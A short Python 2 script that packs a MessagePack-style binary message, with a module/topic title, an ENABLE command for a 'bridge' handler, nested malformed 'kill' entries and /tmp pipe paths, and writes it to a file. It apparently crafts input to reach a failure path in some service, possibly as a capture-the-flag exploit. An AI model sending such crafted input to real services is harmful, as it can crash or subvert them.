import struct

b32 = lambda x: struct.pack('>I', x)

KILL = 7
ENABLE = 6

in_path = '/tmp/memeda-in\x00'
out_path = '/tmp/memeda-out\x00'
title = 'MODULE/sys_1ccd0d12/'
topic = 'nodes-0017f8f3\x00'
title += topic

body = ''

def generate_bins(strings):
    ret = ''
    ret += chr(0x90 + len(strings))
    for s in strings:
        ret += chr(0xc6)
        ret += b32(len(s))
        ret += s
    return ret

def generate_int(x):
    ret = ''
    ret += chr(0xd2)
    ret += b32(x)
    return ret

def generate_fail_kill():
    cmd = ''
    cmd += chr(0xaa)
    return generate_bins([generate_int(KILL), cmd])

# go into cmd_enable_bridge
body1 = generate_bins([generate_int(ENABLE), generate_bins([generate_fail_kill(), generate_fail_kill(), in_path, out_path])]) 

# outer
body += generate_bins([topic, body1])

f = open('a', 'wb')
f.write(title + body)
f.close()



